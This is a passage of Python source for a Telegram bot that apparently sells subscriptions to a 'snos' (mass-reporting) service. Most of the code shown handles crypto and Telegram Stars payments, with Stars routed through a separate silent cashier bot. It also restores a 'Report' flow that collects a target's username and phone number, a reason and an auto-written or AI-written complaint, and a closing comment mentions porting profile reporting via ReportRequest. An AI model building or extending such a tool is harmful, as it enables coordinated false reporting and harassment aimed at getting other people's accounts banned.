        await cb.answer("✅ Оплата прошла, подписка активна!", show_alert=True)
        caption = (
            bq(f"<b>{NAME}</b>  —  Подписка ок")
            + f"\n\n✅ Состояние: <b>{s}</b> ({until})\nМожно пользоваться!"
        )
        await cb.message.edit_caption(
            caption=_cx(caption), parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
            ]))
        await push_send_log(
            "Оплата (CryptoBot)",
            [f"✅ <code>{cb.from_user.id}</code> — план <b>{pk}</b>"
             f" invoice <code>{inv_id}</code>"])
    else:
        await cb.answer(f"⏳ статус: {status or 'не найден'}", show_alert=True)


@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    """Stars invoices are issued per user+plan; nothing else to verify
    server-side — approve within the 10s deadline."""
    await q.answer(ok=True)


@router.message(F.successful_payment)
async def on_successful_payment(msg: Message):
    sp = msg.successful_payment
    payload = sp.invoice_payload or ""
    try:
        kind, pk, uid_s = payload.split(":")
        uid = int(uid_s)
    except Exception:
        log.warning("stars payload broken: %r", payload)
        await msg.answer("⚠️ Платёж принят, но план не распознан — напиши админу.")
        return
    pk = plan_key(pk)
    if pk in SUB_PLANS:
        subs = load_subs()
        try:
            activate_plan(subs, uid, pk)
        except ValueError as ve:
            if "premium_requires_base" in str(ve):
                await msg.answer(
                    _cx(bq(f"<b>{NAME}</b>  —  ⚠️ Премиум недоступен")
                        + "\n\nСначала нужна базовая подписка. "
                        "После её покупки премиум станет доступен."),
                    parse_mode=ParseMode.HTML)
                return
            raise
        bump_pay_stats(uid, pk, "stars",
                       float(sp.total_amount or 0), "XTR")
        commit_file_to_repo("pay_stats.json", "pay stats: stars", cooldown=0)
    try:
        s, until = sub_quality(subs, uid)
        await msg.answer(
            _cx(
            bq(f"<b>{NAME}</b>  —  ⭐ Подписка ок")
            + f"\n\n✅ Состояние: <b>{s}</b> ({until})\nМожно пользоваться!"),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    log.info("stars paid: uid=%s plan=%s charge=%s amount=%s",
             uid, pk, sp.telegram_payment_charge_id, sp.total_amount)
    await push_send_log(
        "Оплата (Telegram Stars)",
        [f"✅ <code>{uid}</code> — план <b>{pk}</b>",
         f"⭐ {sp.total_amount} | charge <code>{sp.telegram_payment_charge_id}</code>"])
    set_current_user(f"( stars plan {pk} )")


@router.callback_query(F.data.startswith("sub:check"))
async def sub_check(cb: CallbackQuery, state: FSMContext):
    parts = cb.data.split(":")
    subs = load_subs()
    if len(parts) == 3:
        inv_id = parts[2]
        data = await state.get_data()
        pend = data.get("pend", {})
        info = pend.get(inv_id)
        if not info:
            info = {"user": cb.from_user.id, "plan": None, "ts": 0}
        try:
            j = await xrocket_get_invoice(inv_id)
        except Exception as e:
            log.error("xrocket status failed: %s", e)
            await cb.answer("\u274c \u0421\u0435\u0440\u0432\u0438\u0441 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d", show_alert=True)
            return
        status = (j.get("status") or "").lower()
        plan_key = info.get("plan")
        pay_user = info.get("user", cb.from_user.id)
        d = j.get("data") or {}
        if isinstance(d, dict) and d.get("kind") == "sub":
            if d.get("plan") in SUB_PLANS:
                plan_key = d["plan"]
            try:
                pay_user = int(d.get("tgId") or pay_user)
            except (TypeError, ValueError):
                pass
        if status in ("paid", "confirmed", "success", "completed"):
            if plan_key and SUB_PLANS.get(plan_key):
                activate_plan(subs, pay_user, plan_key)
                bump_pay_stats(pay_user, plan_key, "xrocket",
                               float(SUB_PLANS[plan_key].get("price", 0)),
                               "USDT")
            await cb.answer("\u2705 \u041e\u043f\u043b\u0430\u0442\u0430 \u043f\u0440\u043e\u0448\u043b\u0430, \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0430!", show_alert=True)
            s, until = sub_quality(subs, info["user"])
            caption = (
                bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a")
                + f"\n\n\u2705 \u0421\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435: <b>{s}</b> ({until})\n"
                + "\u041c\u043e\u0436\u043d\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f!"
            )
            await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                              [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
                                          ]))
            return
        await cb.answer(f"\u23f3 \u0441\u0442\u0430\u0442\u0443\u0441: {status or 'unknown'}", show_alert=True)
    else:
        subs = load_subs()
        s, until = sub_quality(subs, cb.from_user.id)
        if s in ("admin", "forever", "active", "premium"):
            await cb.answer(f"\u2705 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u043e\u043a: {until}", show_alert=True)
        else:
            await cb.answer("\u23f3 \u043e\u043f\u043b\u0430\u0442\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430", show_alert=True)


@router.callback_query(F.data == "menu:subs")
async def menu_subs(cb: CallbackQuery, state: FSMContext):
    await sub_shop(cb, state)
# ── stale ───────────────────────────────────────────────
_REPORT_CB_RE = re.compile(
    r"^(method:[a-z]+|reason:[a-z_]+|cmt:(auto|custom|back)|skip_comment|confirm:(yes|no))$")


async def _fsm_last_entry(uid: int):
    """The user's latest persisted FSM entry: repo file first, store doc second."""
    try:
        if FSM_FILE.exists():
            j = json.loads(FSM_FILE.read_text(encoding="utf-8"))
            for e in j.get("entries", []):
                if e.get("user_id") == uid and str(e.get("state") or "").startswith("Report:"):
                    return e
    except Exception:
        pass
    try:
        fid = (store._INDEX.get("fsm") or {}).get("file_id")
        if fid:
            txt = await store._tg_read("fsm", fid)
            if txt:
                j = json.loads(txt)
                for e in j.get("entries", []):
                    if e.get("user_id") == uid and str(e.get("state") or "").startswith("Report:"):
                        return e
    except Exception:
        pass
    return None


async def _fsm_render_state(cb: CallbackQuery, e: dict) -> None:
    """Re-render the screen matching the restored state as a fresh message."""
    data = e.get("data") or {}
    st = str(e.get("state") or "")
    try:
        if st == "Report:comment" and data.get("target"):
            await cb.message.answer(_cx(comment_step_text(data)),
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_comment_step())
        elif st == "Report:confirm" and data.get("target"):
            await cb.message.answer(_cx(summary_text(data)),
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_confirm())
        elif st == "Report:method":
            await cb.message.answer(_cx(bq(f"<b>{NAME}</b>  —  Метод жалобы")
                                        + "\n\nВыбери метод:"),
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_methods())
        elif st == "Report:reason":
            await cb.message.answer(_cx(bq(f"<b>{NAME}</b>  —  Причина")
                                        + "\n\nВыбери причину:"),
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_reasons(data.get("method") or ""))
        elif st == "Report:target":
            _hint = ("Пришли ссылку на сообщение."
                     if data.get("method") == "message" else
                     "Пришли юзернейм и номер: <code>@user +79991234567</code>."
                     if data.get("method") == "session" else
                     "Пришли ссылку на статью telegra.ph."
                     if data.get("method") == "telegraph" else
                     "Пришли юзернейм цели (<code>@name</code> или ссылку).")
            await cb.message.answer(_cx(bq(f"<b>{NAME}</b>  —  Цель")
                                        + "\n\n" + _hint),
                                    parse_mode=ParseMode.HTML)
        else:
            await cb.message.answer(_cx(bq(f"<b>{NAME}</b>")
                                        + "\n\nФлоу восстановлен — открой меню /start."),
                                    parse_mode=ParseMode.HTML)
    except Exception as e2:
        log.warning("fsm render failed: %s", e2)


@router.callback_query()
async def stale_cb(cb: CallbackQuery, state: FSMContext):
    # Known flow buttons are routed by data even with a stale/missing state —
    # they must never fall through into the "expired session" dead end.
    d0 = cb.data or ""
    if d0.startswith("txt:"):
        await state.set_state(Report.text_choice)
        if d0 == "txt:custom":
            await txt_custom(cb, state)
        else:
            await txt_ai(cb, state)
        return
    if d0.startswith("tier:"):
        await fb_tier(cb, state)
        return
    if d0.startswith("method:"):
        await fb_method(cb, state)
        return
    if d0.startswith("confirm:"):
        await fb_confirm(cb, state)
        return
    if d0.startswith("reason:"):
        await state.set_state(Report.reason)
        await got_reason(cb, state)
        return
    if d0 == "skip_comment":
        await state.set_state(Report.comment)
        await skip_comment(cb, state)
        return
    if d0 in ("cmt:custom", "cmt:auto", "cmt:menu", "cmt:back"):
        await state.set_state(Report.comment)
        if d0 == "cmt:custom":
            await cmt_custom(cb, state)
        elif d0 == "cmt:auto":
            await cmt_auto(cb, state)
        elif d0 == "cmt:menu":
            await cmt_menu(cb, state)
        else:
            await cmt_back(cb, state)
        return
    # a press on a screen whose flow state is gone: pull the persisted
    # state back live, re-render its screen — dead screens stop dead-ending
    try:
        d = cb.data or ""
        if _REPORT_CB_RE.match(d):
            dp = globals().get("_DP")
            ent = await _fsm_last_entry(cb.from_user.id)
            if dp is not None:
                from aiogram.fsm.storage.base import StorageKey
                from aiogram.fsm.storage.memory import MemoryStorageRecord
                key = StorageKey(
                    bot_id=int((ent or {}).get("bot_id") or 0)
                    or int(getattr(_BOT, "id", 0) or 0),
                    chat_id=cb.from_user.id, user_id=cb.from_user.id)
                live = dp.storage.storage.get(key)
                live_state = getattr(live, "state", None)
                if live_state:
                    # a real flow is live — this press came from a dead
                    # screen; re-render the live flow's current screen
                    ent = {"state": live_state,
                           "data": getattr(live, "data", None) or {},
                           "bot_id": key.bot_id}
                elif ent:
                    dp.storage.storage[key] = MemoryStorageRecord(
                        state=ent.get("state"), data=ent.get("data") or {})
                    try:
                        dp.storage._flush()
                    except Exception:
                        pass
                if ent:
                    await _fsm_render_state(cb, ent)
                    try:
                        await push_send_log(
                            "Flow resurrected",
                            [f"\U0001f464 {html_mod.escape(cb.from_user.full_name or '?')} "
                             f"(<code>{cb.from_user.id}</code>)",
                             f"\U0001f501 <code>{html_mod.escape(ent.get('state') or '?')}</code> ← "
                             f"<code>{html_mod.escape(d)}</code>"])
                    except Exception:
                        pass
                    await cb.answer("✅ Флоу восстановлен — жми кнопку на новом сообщении",
                                    show_alert=True)
                    return
    except Exception as e:
        log.warning("stale revive failed: %s", e)
    try:
        await push_send_log(
            "Stale callback",
            [f"\U0001f464 {html_mod.escape(cb.from_user.full_name or '?')} "
             f"(<code>{cb.from_user.id}</code>)",
             f"\U0001f518 <code>{html_mod.escape(cb.data or '?')}</code>"])
    except Exception:
        pass
    await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)


# ── maintenance gate ────────────────────────────────────────
# Every non-admin user gets "under maintenance" on ANY action (/start,
# buttons, text); the boss (8661362112) and ADMIN_ID env keep full access.
# Switch off with MAINTENANCE=0 env (GitHub secret / .env).

# ── premium custom emoji (pack: t.me/addemoji/tgmacicons) ──
_CUSTOM_EMOJI = {
    "🚀": '5323404142809467476', "🝬": '5258254475386167466',
    "◀": '5258132936401624790', "📡": '5258391025281408576', "🔑": '5258476306152038031',
    '👨\u200d🎨': '5258450450448915742',
    '👩\u200d🎨': '5258215635996908355',
    '✈️': '5258115571848846212',
    '⭐️': '5258165702707125574',
    '⚽️': '5258169263235013408',
    '⚡️': '5323404142809467476',
    '✍️': '5258331647358540449',
    '↔️': '5260233433107407649',
    '➡️': '5204189706237004154',
    '❤️': '5258179403652801593',
    '↗️': '5257991477358763590',
    '⬅️': '5258132936401624790',
    '❗️': '5258474669769497337',
    '⬇️': '5258336354642697821',
    '☁️': '5280867942056108177',
    '⬆️': '5258043150110301407',
    'ℹ️': '5258503720928288433',
    '☀️': '5258089153505009279',
    '⛔️': '5275969776668134187',
    '⛔': '5275969776668134187',
    '⭐': '5258165702707125574',
    '✈': '5258115571848846212',
    '⚽': '5258169263235013408',
    '✍': '5258331647358540449',
    '↔': '5260233433107407649',
    '➡': '5204189706237004154',
    '↗': '5257991477358763590',
    '⬆': '5258043150110301407',
    '⬇': '5258336354642697821',
    '⬅': '5258132936401624790',
    '❗': '5258474669769497337',
    '❤': '5258179403652801593',
    '☀': '5258089153505009279',
    '☁': '5280867942056108177',
    '⚠': '5258474669769497337',
    '🎯': '5258509201306557640',
    '⏳': '5258258882022612173',
    '💳': '5258204546391351475',
    '🌐': '5258423306255604960',
    '🔍': '5429571366384842791',
    '🛡': '5258476306152038031',
    '🔪': '5258278668936945760',
    '💀': '5267123797600783095',
    '🎁': '5298988357538328017',
    '🔐': '5258476306152038031',
    '🔌': '5258096772776991776',
    '🪞': '5258254475386167466',
    '🧷': '5258461531464539536',
    '🟢': '5357069174512303778',
    '❓': '5258503720928288433',
    '🧾': '5258477770735885832',
    '⏱': '5258258882022612173',
    '✏': '5370546867786523009',
    '🎨': '5258450450448915742',
    '💸': '5258204546391351475',
    '💢': '5258474669769497337',
    '💊': '5323585953070074710',
    '⏭': '5204189706237004154',
    '⏩': '5204189706237004154',
    '🔔': '5260325873688518261',
    '⏰': '5258419835922030550',
    '🛰': '5258212268742549391',
    '📢': '5260268501515377807',
    '👑': '5298988357538328017',
    '📅': '5258105663359294787',
    '📊': '5258391025281408576',
    '👨': '5256143829672672750',
    '👩': '5256143829672672750',
    '🛠': '5258096772776991776',
    '❎': '5267123797600783095',
    '🧬': '5258486128742244085',
    '🧝': '5258093637450866522',
    '🎉': '5258165702707125574',
    '💵': '5258204546391351475',
    '🆔': '5226513232549664618',
    '🧰': '5258096772776991776',
    '✉': '5260268501515377807',
    '📧': '5260268501515377807',
    '📨': '5260268501515377807',
    '📫': '5260268501515377807',
    '📤': '5260268501515377807',
    '📥': '5452165780579843515',
    '📱': '5258020476977946656',
    '📲': '5258020476977946656',
    '🏦': '5258204546391351475',
    '🔢': '5226513232549664618',
    '🖼': '5258254475386167466',
    '👤': '5256143829672672750',
    '📂': '5257969839313526622',
    '❌': '5267123797600783095',
    '🐻': '5258145898612924124',
    '📝': '5370546867786523009',
    '🪙': '5258368777350816286',
    '📖': '5258328383183396223',
    '🤖': '5258093637450866522',
    '💼': '5258260149037965799',
    '🗓': '5258105663359294787',
    '🤙': '5258337316715373336',
    '📸': '5255813559572508065',
    '📣': '5260268501515377807',
    '✅': '5357069174512303778',
    '⛓': '5260730055880876557',
    '📄': '5258477770735885832',
    '©': '5258507474729704350',
    '👥': '5258486128742244085',
    '🗑': '5258130763148172425',
    '🎭': '5258430848218176413',
    '📁': '5452165780579843515',
    '🎮': '5258508428212445001',
    '🎓': '5258334872878980409',
    '🏘': '5257963315258204021',
    '🚪': '5258084656674250503',
    '💡': '5258216851472654189',
    '📍': '5258509201306557640',
    '🔒': '5258476306152038031',
    '💬': '5427181942934088912',
    '🌘': '5258011861273551368',
    '🎵': '5258289810082111221',
    '🔕': '5260264520080695245',
    '🎶': '5258334469152054985',
    '📌': '5258461531464539536',
    '➕': '5359529383319084413',
    '🍑': '5258330865674494479',
    '🔫': '5258278668936945760',
    '👏': '5258501105293205250',
    '🔄': '5260687119092817530',
    '🌠': '5258212268742549391',
    '🔃': '5260687681733533075',
    '💎': '5298988357538328017',
    '🤚': '5260249440450520061',
    '🗳': '5258200019495821936',
    '🕔': '5258419835922030550',
    '⏲': '5258258882022612173',
    '👀': '5260341314095947411',
    '🔼': '5260379144167890225',
    '💻': '5258423306255604960',
    '🙂': '5258262708838472996',
    '🔇': '5258267368877989660',
    '📈': '5258391025281408576',
    '📚': '5260512129240276089',
    '📦': '5258134813302332906',
    '✋': '5258362429389152256',
    '📹': '5258077307985207053',
    '📞': '5258020476977946656',
    '📼': '5258391252914676042',
    '🙃': '5258318251355545562',
    '🕘': '5199457120428249992',
    '🎙': '5260652149469094137',
    '💰': '5258204546391351475',
    '⚙': '5258096772776991776',
    '♾': '5271934788037517525',
    '🔊': '5260325873688518261',
    '📰': '5249231689695115145',
    '🏷': '5296678515536581003',
    '🔎': '5429571366384842791',
    '👁': '5253959125838090076',
    '🔞': '5323585953070074710',
    '🍴': '5296727963495079440',
    '🔖': '5359629206948976159',
}

def _cx(text: str) -> str:
    """Swap plain emoji chars for <tg-emoji> custom entities (premium pack
    tgmacicons). Idempotent: existing <tg-emoji> blocks pass through."""
    if not text:
        return text
    parts = re.split(r"(<tg-emoji\s[^>]*>.*?</tg-emoji>)", text)
    for i, part in enumerate(parts):
        if i % 2 == 1:
            continue
        for ch, eid in _CUSTOM_EMOJI.items():
            if ch in part:
                part = part.replace(
                    ch, f'<tg-emoji emoji-id="{eid}">{ch}</tg-emoji>')
        parts[i] = part
    return re.sub(r"</tg-emoji>\ufe0f", "</tg-emoji>",
                   "".join(parts))


MAINTENANCE_ADMIN_IDS: set[int] = _ADMIN_IDS


def _make_maintenance_gate():
    on = os.getenv("MAINTENANCE", "1") != "0"
    ids = set(MAINTENANCE_ADMIN_IDS)
    if ADMIN_ID:
        try:
            ids.add(int(ADMIN_ID))
        except ValueError:
            pass
    text = ("\U0001f6e0 \u0411\u043e\u0442 \u043d\u0430 \u0442\u0435\u0445\u043d\u0438\u0447\u0435\u0441\u043a\u0438\u0445 \u0440\u0430\u0431\u043e\u0442\u0430\u0445. "
            "\u0421\u043a\u043e\u0440\u043e \u043e\u0442\u043a\u0440\u043e\u0435\u0442\u0441\u044f \u2014 \u0437\u0430\u0433\u043b\u044f\u043d\u0438 \u0447\u0443\u0442\u044c \u043f\u043e\u0437\u0436\u0435.")

    async def _gate(handler, event, data):
        if not on:
            return await handler(event, data)
        if event.message is not None:
            uid = getattr(getattr(event.message, "from_user", None), "id", None)
            if uid in ids:
                return await handler(event, data)
            try:
                await event.message.answer(
                    _cx(text), parse_mode=ParseMode.HTML)
            except Exception as e:
                log.debug("maintenance notice failed: %s", e)
            return
        if event.callback_query is not None:
            uid = getattr(getattr(event.callback_query, "from_user", None),
                          "id", None)
            if uid in ids:
                return await handler(event, data)
            try:
                await event.callback_query.answer(text, show_alert=True)
            except Exception as e:
                log.debug("maintenance cb-notice failed: %s", e)
            return
        return  # other update types from non-admins: held silently

    return _gate



# ── fsm persistence: flows survive restarts ─────────────
FSM_FILE = Path(__file__).parent / "fsm_state.json"


class PersistStorage(MemoryStorage):
    """MemoryStorage with instant persistence: every state/data change is
    flushed to FSM_FILE and committed to the repo, so restarts and
    deploys resume user flows instead of killing them."""

    def _flush(self) -> None:
        try:
            entries = []
            for k, rec in self.storage.items():
                st = getattr(rec, "state", None)
                dat = getattr(rec, "data", None) or {}
                if st is None and not dat:
                    continue
                entries.append({
                    "bot_id": k.bot_id, "chat_id": k.chat_id,
                    "user_id": k.user_id,
                    "thread_id": getattr(k, "thread_id", 0) or 0,
                    "biz": getattr(k, "business_connection_id", None) or "",
                    "destiny": getattr(k, "destiny", "default") or "default",
                    "state": st,
                    "data": dat,
                })
            text = json.dumps({"v": 1, "entries": entries},
                              ensure_ascii=False, default=str)
            try:
                if FSM_FILE.exists() and FSM_FILE.read_text(
                        encoding="utf-8") == text:
                    return
            except Exception:
                pass
            FSM_FILE.write_text(text, encoding="utf-8")
            commit_file_to_repo("fsm_state.json", "fsm update", cooldown=15)
        except Exception as e:
            log.warning("fsm flush failed: %s", e)

    async def set_state(self, key, state=None):
        await super().set_state(key, state)
        self._flush()

    async def set_data(self, key, data):
        await super().set_data(key, data)
        self._flush()

    async def update_data(self, key, data):
        r = await super().update_data(key, data)
        self._flush()
        return r




def fsm_restore(bot=None) -> None:
    try:
        if not FSM_FILE.exists():
            return
        j = json.loads(FSM_FILE.read_text(encoding="utf-8"))
        dp = globals().get("_DP")
        if dp is None:
            return
        from aiogram.fsm.storage.base import StorageKey
        from aiogram.fsm.storage.memory import MemoryStorageRecord
        bid = getattr(bot, "id", None)
        n = 0
        for e in j.get("entries", []):
            try:
                if bid and e.get("bot_id") != bid:
                    continue
                kw = {"bot_id": e["bot_id"], "chat_id": e["chat_id"],
                      "user_id": e["user_id"]}
                if e.get("thread_id"):
                    kw["thread_id"] = e["thread_id"]
                if e.get("biz"):
                    kw["business_connection_id"] = e["biz"]
                if e.get("destiny") and e["destiny"] != "default":
                    kw["destiny"] = e["destiny"]
                key = StorageKey(**kw)
            except Exception:
                continue
            if key in dp.storage.storage:
                continue   # live state wins over the persisted snapshot
            dp.storage.storage[key] = MemoryStorageRecord(
                state=e.get("state"), data=e.get("data") or {})
            n += 1
        if n:
            log.info("fsm restored: %d flows", n)
    except Exception as e:
        log.warning("fsm restore failed: %s", e)


# ── run ─────────────────────────────────────────────────
# ── ArchV3Bot cashier mode: stars land on @ArchV3Bot ─────
# ARCH_CASHIER=1 → snoser.py runs a tiny stars-only bot on the ARCH token:
# deep link ?start=buy_xtr_<plan> → XTR invoice → successful_payment writes
# star_orders.json to the repo. The MAIN bot polls that file and activates
# the plans — the purchase is granted from the other bot.
ARCH_CASHIER = (os.getenv("ARCH_CASHIER", "").strip() == "1")
STAR_ORDERS_FILE = Path(__file__).parent / "star_orders.json"
ARCH_BOT_USERNAME = (os.getenv("ARCH_BOT_USERNAME", "").strip()
                     or "ArchV3Bot")


def _star_orders_local() -> list:
    try:
        j = json.loads(STAR_ORDERS_FILE.read_text(encoding="utf-8"))
        return j.get("orders") or []
    except Exception:
        return []


async def star_orders_read() -> list:
    txt = await store._gh_get_text("star_orders.json")
    if txt:
        try:
            return json.loads(txt).get("orders") or []
        except Exception:
            pass
    return _star_orders_local()


async def star_orders_write(orders: list, msg: str) -> bool:
    txt = json.dumps({"orders": orders}, ensure_ascii=False, indent=1)
    ok = await store._gh_put_text("star_orders.json", txt, msg)
    try:
        STAR_ORDERS_FILE.write_text(txt, encoding="utf-8")
    except Exception:
        pass
    return ok


cashier_router = Router(name="cashier")


@cashier_router.message(CommandStart())
async def cashier_start(msg: Message, state: FSMContext):
    """cashier stays SILENT — /start produces no answer at all."""
    return


@cashier_router.callback_query(F.data.startswith("sub:buy:xtr:"))
async def cashier_buy(cb: CallbackQuery):
    """Old plan buttons: silent ack, no invoice (links come from the main bot)."""
    await cb.answer()
    return


@cashier_router.pre_checkout_query()
async def cashier_pre_checkout(q: PreCheckoutQuery):
    """Stars invoice per user+plan — nothing to verify, approve in 10s."""
    await q.answer(ok=True)


@cashier_router.message(F.successful_payment)
async def cashier_paid(msg: Message):
    """Record the payment ONLY — no user message, no log-chat message."""
    sp = msg.successful_payment
    try:
        _, pk, uid_s = (sp.invoice_payload or "").split(":")
        uid = int(uid_s)
    except Exception:
        log.warning("cashier payload broken: %r", sp.invoice_payload)
        return
    pk = plan_key(pk)
    orders = await star_orders_read()
    orders.append({"uid": uid, "plan": pk, "amount": sp.total_amount,
                   "ts": time.time(), "done": False})
    await star_orders_write(orders, f"star order {uid} {pk}")
    bump_pay_stats(uid, pk, "stars", float(sp.total_amount or 0), "XTR")
    commit_file_to_repo("pay_stats.json", "pay stats: stars (cashier)",
                        cooldown=0)


async def star_orders_grant_loop():
    """MAIN-bot side: poll star_orders.json and activate paid plans."""
    await asyncio.sleep(20)
    while True:
        try:
            orders = await star_orders_read()
            todo = [o for o in orders if isinstance(o, dict)
                    and not o.get("done")]
            if todo:
                changed = False
                for o in todo:
                    uid, pk = int(o.get("uid", 0) or 0), o.get("plan", "")
                    pk = plan_key(pk)
                    if pk not in SUB_PLANS:
                        o["done"] = True
                        o["note"] = "bad plan"
                        changed = True
                        continue
                    subs = load_subs()
                    activate_plan(subs, uid, pk)
                    bump_pay_stats(uid, pk, "stars",
                                   float(o.get("amount") or 0), "XTR")
                    commit_file_to_repo("pay_stats.json",
                                        "pay stats: stars grant", cooldown=0)
                    o["done"] = True
                    o["granted_ts"] = time.time()
                    changed = True
                    s, until = sub_quality(subs, uid)
                    try:
                        await _BOT.send_message(
                            uid,
                            _cx(bq(f"<b>{NAME}</b> — ⭐ Подписка ок")
                                + f"\n\n✅ Состояние: <b>{s}</b> ({until})\n"
                                  "Можно пользоваться!"),
                            parse_mode=ParseMode.HTML)
                    except Exception:
                        pass
                    await push_send_log(
                        "Оплата (Stars)",
                        [f"✅ <code>{uid}</code> — план <b>{pk}</b> выдан "
                         f"({o.get('amount')}⭐, касса @{ARCH_BOT_USERNAME})"])
                if changed:
                    await star_orders_write(orders, "star orders granted")
        except Exception as e:
            log.warning("star orders loop: %s", e)
        await asyncio.sleep(40)


async def cashier_main():
    if not BOT_TOKEN:
        log.error("cashier: BOT_TOKEN (ARCH token) missing")
        return
    async def _silent_log(title: str, lines: list) -> None:
        pass
    globals()["push_send_log"] = _silent_log   # zero Telegram output from cashier
    dp = Dispatcher()
    dp.include_router(cashier_router)
    log.info("%s cashier mode starting...", NAME)
    while True:
        bot = Bot(token=BOT_TOKEN)
        try:
            globals()["_BOT"] = bot
            store.init(bot, BOT_TOKEN)
            await dp.start_polling(bot)
            break
        except TelegramNetworkError:
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)
        except Exception as e:
            log.error("cashier polling crashed: %s — retry in 5s", e)
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)


# ── stateless stars: invoice links + transaction poller ────
# The cashier token alone is enough: createInvoiceLink issues an XTR payment
# link owned by @ArchV3Bot (stars land on its balance), and
# getStarTransactions exposes source.invoice_payload + source.user.id, so
# the MAIN bot grants plans without any live cashier process or order file.
ARCH_TOKEN = os.getenv("ARCH_BOT_TOKEN", "").strip()
_star_link_cache: dict[tuple[int, str], tuple[str, float]] = {}


async def arch_api(method: str, params: dict | None = None) -> dict:
    """Call the cashier bot's Bot API directly (no polling process needed)."""
    if not ARCH_TOKEN:
        return {}
    url = f"https://api.telegram.org/bot{ARCH_TOKEN}/{method}"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if params:
                async with s.post(url, json=params) as r:
                    j = await r.json(content_type=None)
            else:
                async with s.get(url) as r:
                    j = await r.json(content_type=None)
        return j if j and j.get("ok") else {}
    except Exception as e:
        log.warning("arch_api %s: %s", method, e)
        return {}


async def arch_star_link(pk: str, uid: int) -> str:
    """One-click XTR invoice link issued by @ArchV3Bot — its balance gets the stars."""
    key = (uid, pk)
    hit = _star_link_cache.get(key)
    if hit and time.time() - hit[1] < 300:
        return hit[0]
    pl = SUB_PLANS.get(pk) or SUB_PLANS["d30"]
    j = await arch_api("createInvoiceLink", {
        "title": f"{NAME} — {pl['label']}"[:32],
        "description": f"Оплата доступа: {pl['label']}"[:255],
        "payload": f"star:{pk}:{uid}",
        "currency": "XTR",
        "provider_token": "",
        "prices": [{"label": pl["label"][:32],
                    "amount": STARS_PRICES.get(pk, 400)}],
    })
    link = (j.get("result") or "") if isinstance(j.get("result"), str) else ""
    if link:
        _star_link_cache[key] = (link, time.time())
    return link


STAR_PAID_FILE = Path(__file__).parent / "star_paid.json"


def _star_paid_local() -> list:
    try:
        j = json.loads(STAR_PAID_FILE.read_text(encoding="utf-8"))
        return j.get("ids") or []
    except Exception:
        return []


async def star_paid_read() -> list:
    txt = await store._gh_get_text("star_paid.json")
    if txt:
        try:
            return json.loads(txt).get("ids") or []
        except Exception:
            pass
    return _star_paid_local()


async def star_paid_write(ids: list) -> None:
    txt = json.dumps({"ids": ids[-500:]}, ensure_ascii=False, indent=1)
    await store._gh_put_text("star_paid.json", txt, "stars paid dedupe")
    try:
        STAR_PAID_FILE.write_text(txt, encoding="utf-8")
    except Exception:
        pass


async def star_tx_grant_loop():
    """Watch @ArchV3Bot's incoming XTR transactions; grant plans here."""
    await asyncio.sleep(10)
    last_bal = None
    while True:
        try:
            if not ARCH_TOKEN:
                log.warning("stars: ARCH_BOT_TOKEN missing — tx poll idle")
            else:
                j = await arch_api("getStarTransactions", {"limit": 100})
                txs = ((j.get("result") or {}).get("transactions") or [])
                paid = await star_paid_read()
                seen = set(paid)
                new_ids = []
                for tx in txs:
                    tid = str(tx.get("id") or "")
                    src = tx.get("source") or {}
                    pay = src.get("invoice_payload") or ""
                    if (not tid or tid in seen
                            or src.get("type") != "user"
                            or src.get("transaction_type") != "invoice_payment"
                            or not pay.startswith("star:")):
                        continue
                    try:
                        _, pk, uid_s = pay.split(":")
                        uid = int(uid_s)
                    except Exception:
                        continue
                    pk = plan_key(pk)
                    if pk not in SUB_PLANS:
                        continue
                    subs = load_subs()
                    activate_plan(subs, uid, pk)
                    bump_pay_stats(uid, pk, "stars",
                                   int(tx.get("amount") or 0), "XTR")
                    commit_file_to_repo("pay_stats.json",
                                        "pay stats: stars tx", cooldown=0)
                    seen.add(tid)
                    new_ids.append(tid)
                    s, until = sub_quality(subs, uid)
                    try:
                        await _BOT.send_message(
                            uid,
                            _cx(bq(f"<b>{NAME}</b> — ⭐ Подписка ок")
                                + f"\n\n✅ Состояние: <b>{s}</b> ({until})\n"
                                  "Можно пользоваться!"),
                            parse_mode=ParseMode.HTML)
                    except Exception:
                        pass
                    await push_send_log(
                        "Оплата (Stars)",
                        [f"✅ <code>{uid}</code> — план <b>{pk}</b> "
                         f"({tx.get('amount')}⭐) · "
                         f"<code>{html_mod.escape(tid)}</code> · "
                         f"касса @{ARCH_BOT_USERNAME}"])
                if new_ids:
                    await star_paid_write(paid + new_ids)
                bj = await arch_api("getMyStarBalance", {})
                bal = (bj.get("result") or {}).get("balance")
                if bal is not None and bal != last_bal:
                    last_bal = bal
                    await push_send_log(
                        "Касса @ArchV3Bot",
                        [f"⭐ баланс: <b>{bal}</b>"])
        except Exception as e:
            log.warning("star tx loop: %s", e)
        await asyncio.sleep(30)


# ── profile snos port: "Other -> Misc -> text" via ReportRequest(id=[]) ──
# Source: profile_snos.py supplied by the operator. No external imports;
